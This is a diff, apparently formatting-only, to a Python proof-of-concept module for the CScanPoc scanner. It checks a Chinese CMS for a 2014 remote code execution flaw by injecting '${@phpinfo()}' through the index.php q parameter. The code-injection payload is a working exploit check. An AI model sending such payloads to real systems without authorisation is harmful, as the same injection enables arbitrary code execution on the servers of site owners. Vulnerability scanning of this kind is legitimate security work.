@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'JISU_0001' # 平台漏洞编号，留空
+    vuln_id = 'JISU_0001'  # 平台漏洞编号，留空
     name = '台州市极速网络CMS /index.php 任意代码执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2014-11-13'  # 漏洞公布时间
     desc = '''
         台州市极速网络CMS /index.php 任意代码执行漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '台州市极速网络CMS'  # 漏洞应用名称
     product_version = '*'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '78b5b220-8f32-412b-96e3-3422c15db865'
@@ -31,20 +33,21 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/index.php?col=13&mod=web&q=%24{%40phpinfo()}'
             verify_url = self.target + payload
 
             content = urllib2.urlopen(verify_url).read()
             if '<title>phpinfo()</title>' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
